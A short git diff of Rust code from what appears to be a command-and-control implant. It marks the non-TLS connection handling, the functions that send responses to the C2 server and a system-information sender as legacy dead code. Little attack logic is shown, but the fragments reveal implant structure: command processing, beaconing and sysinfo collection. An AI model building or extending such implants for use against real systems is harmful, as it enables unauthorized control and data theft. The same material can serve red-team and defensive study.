@@ -356,7 +356,10 @@ fn process_command(command: &str) -> String {
     }
 }
 
-// Keep the old handle_connection for backwards compatibility (won't be used)
+// Legacy functions for non-TLS connections (kept for backwards compatibility reference)
+// These are not used when TLS is enabled, but are kept in case TLS needs to be disabled
+
+#[allow(dead_code)]
 fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     // Try to clone the stream, return early if it fails
     let reader_stream = match stream.try_clone() {
@@ -484,8 +487,9 @@ fn handle_connection(stream: TcpStream, _beacon_config: &beacon::BeaconConfig) {
     }
 }
 
-/// Helper function to send a response to the C2 server
+/// Helper function to send a response to the C2 server (legacy, non-TLS)
 /// Returns false if the connection is broken (write or flush failed)
+#[allow(dead_code)]
 fn send_response(writer: &mut TcpStream, response: &str) -> bool {
     if let Err(e) = writer.write_all(response.as_bytes()) {
         debug_print!("DEBUG: Error escribiendo respuesta: {}", e);
@@ -500,6 +504,8 @@ fn send_response(writer: &mut TcpStream, response: &str) -> bool {
     true
 }
 
+/// Legacy non-TLS sysinfo sender (kept for reference)
+#[allow(dead_code)]
 fn send_sysinfo(writer: &mut TcpStream) -> bool {
     debug_print!("DEBUG: Recopilando información del sistema...");
     
